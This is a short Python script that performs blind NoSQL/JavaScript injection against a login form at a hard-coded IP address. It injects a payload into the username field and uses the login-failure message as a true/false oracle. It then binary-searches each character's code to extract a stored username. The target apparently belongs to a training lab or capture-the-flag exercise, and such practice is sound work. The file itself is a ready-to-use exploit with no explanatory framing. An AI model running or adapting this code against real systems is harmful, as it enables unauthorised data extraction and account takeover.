import requests
from urllib.parse import quote_plus

num_req = 0
def oracle(r):
    global num_req
    num_req += 1
    r = requests.post(
        "http://94.237.63.93:48735/login",
        headers={"Content-Type":"application/x-www-form-urlencoded"},
        data="username=%s&password=x" % (quote_plus('" || (' + r + ') || "1"=="'))
    )
    return "Log in failed with the given credentials." in r.text

assert (oracle('false') == False)
assert (oracle('true') == True)

num_req = 0
extraction = ""
i = len(extraction)
while True:
    low = 32 # Set low value of search area (' ')
    high = 127 # Set high value of search area ('~')
    mid = 0
    while low <= high:
        mid = (high + low) // 2
        if oracle('this.username.startsWith("") && this.username.charCodeAt(%d) > %d' % (i, mid)):
            low = mid + 1 # If ASCII value of extraction at index 'i' < midpoint, increase the lower boundary and repeat
        elif oracle('this.username.startsWith("") && this.username.charCodeAt(%d) < %d' % (i, mid)):
            high = mid - 1 # If ASCII value of extraction at index 'i' > midpoint, decrease the upper boundary and repeat
        else:
            extraction += chr(mid) # If ASCII value is neither higher or lower than the midpoint we found the target value
            print(extraction)
            break # Break out of the loop
    i += 1

assert (oracle('this.username == `%s`' % extraction) == True)
print("Extraction: %s" % extraction)
print("Requests: %d" % num_req)